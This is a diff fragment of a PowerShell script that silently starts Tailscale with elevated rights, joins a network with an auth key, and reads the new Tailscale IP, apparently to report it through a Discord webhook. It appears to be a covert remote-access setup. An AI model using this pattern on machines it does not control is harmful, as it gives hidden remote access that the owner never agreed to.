@@ -79,12 +79,11 @@ Start-Sleep 5
  
 Start-Process -FilePath "C:\Tailscale\tailscaled.exe" -windowstyle hidden -Verb RunAs
 Start-Process -FilePath 'C:\Tailscale\tailscale-ipn.exe' -windowstyle hidden -Verb RunAs 
- 
+Start-Sleep 1
+Start-Process -FilePath "C:\Tailscale\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList "up --authkey $authKey --unattended"
 
 ## Sends Discord Webhook
 # FIXME: Message isn't beeing send
-Start-Sleep 1
-Start-Process -FilePath "C:\Tailscale\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList "up --authkey $authKey --unattended"
 $ip = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred -InterfaceAlias "Tailscale").IPAddress 
 
 $description = @"
